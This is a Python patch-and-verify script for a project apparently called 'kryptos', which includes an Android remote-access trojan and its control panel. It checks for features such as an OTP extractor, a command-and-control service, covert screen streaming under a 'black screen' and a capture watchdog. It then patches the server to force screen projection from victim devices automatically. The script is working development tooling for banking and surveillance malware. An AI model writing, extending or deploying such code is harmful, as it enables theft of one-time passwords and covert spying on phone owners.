M = r"C:\Users\user\kryptos\server\main.py"
J = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\UiAssistBridge.java"
C = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\CommandControlService.java"
S = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\ScreenStreamService.java"
F = r"C:\Users\user\kryptos\server\web-app\src\pages\DeviceControl.tsx"

checks = [
  ("panel: extractor de OTP", M, "[KRYPTOS-OTP] INICIO"),
  ("panel: event loop liberado", M, "_TREE_HASH"),
  ("panel: auto-proyeccion en pantalla negra", M, "_FORCEPROJ_TS"),
  ("apk: frames de proyeccion no se descartan", J, "!silentScreenActive && !ScreenStreamService.isActive()"),
  ("apk: back diferido (no cierra apps)", J, 'cur, ""'),
  ("apk: jerarquia con throttle (V2 rapido)", J, "lastHierJson"),
  ("apk: proyeccion pedida siempre", J, "forceProjection"),
  ("apk: watchdog de captura", C, "startCaptureWatchdog"),
  ("apk: forceEnsure", S, "forceEnsure"),
  ("panel: boton pantalla negra optimista", F, "UI otimista"),
]
falta = []
for name, path, marker in checks:
    ok = marker in open(path, encoding="utf-8").read()
    print(("OK    " if ok else "FALTA ") + name)
    if not ok:
        falta.append(name)
print("---")

if "_FORCEPROJ_TS" not in open(M, encoding="utf-8").read():
    import shutil
    shutil.copyfile(M, M + ".bak_projauto")
    s = open(M, encoding="utf-8").read()
    o = "            _tv[device_id] = _is_black"
    s = s.replace(o, o + """
            if _is_black:
                _fp = globals().setdefault("_FORCEPROJ_TS", {})
                if now_ts - _fp.get(device_id, 0.0) >= 8.0:
                    _fp[device_id] = now_ts
                    try:
                        asyncio.create_task(self.send_command(device_id, {"action": "FORCE_PROJECTION"}))
                        logger.warning("[PROJ] tela preta -> FORCE_PROJECTION " + device_id)
                    except Exception:
                        pass""")
    open(M, "w", encoding="utf-8").write(s)
    print("auto-proyeccion APLICADA")
else:
    print("auto-proyeccion ya estaba")
